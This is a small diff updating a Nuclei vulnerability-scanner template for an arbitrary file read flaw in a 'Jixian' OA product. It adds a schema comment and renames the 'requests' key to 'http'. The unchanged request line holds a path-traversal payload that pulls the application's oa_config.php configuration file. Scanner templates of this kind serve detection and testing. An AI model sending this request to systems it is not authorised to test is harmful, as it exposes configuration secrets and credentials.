@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Jixian-Arbitrary-file-read
 
 info:
@@ -7,7 +8,7 @@ info:
   description: Jixian-Arbitrary-file-read
   tags: Jixian,file-read
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
